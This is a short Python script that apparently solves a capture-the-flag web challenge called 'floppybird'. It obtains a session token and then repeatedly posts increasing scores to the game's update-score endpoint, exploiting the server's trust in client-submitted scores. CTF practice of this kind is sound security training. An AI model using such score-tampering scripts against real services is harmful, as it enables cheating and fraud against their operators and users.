#!/usr/bin/env python3
import requests, json

SITE = "http://floppybird.challs.olicyber.it/"
token = json.loads(requests.get(SITE + "get-token").text)["token"]
r = ""

for i in range(1001):
    r = requests.post(SITE + "update-score", json={"token": token, "score": i}).text
    print(r.strip(), i)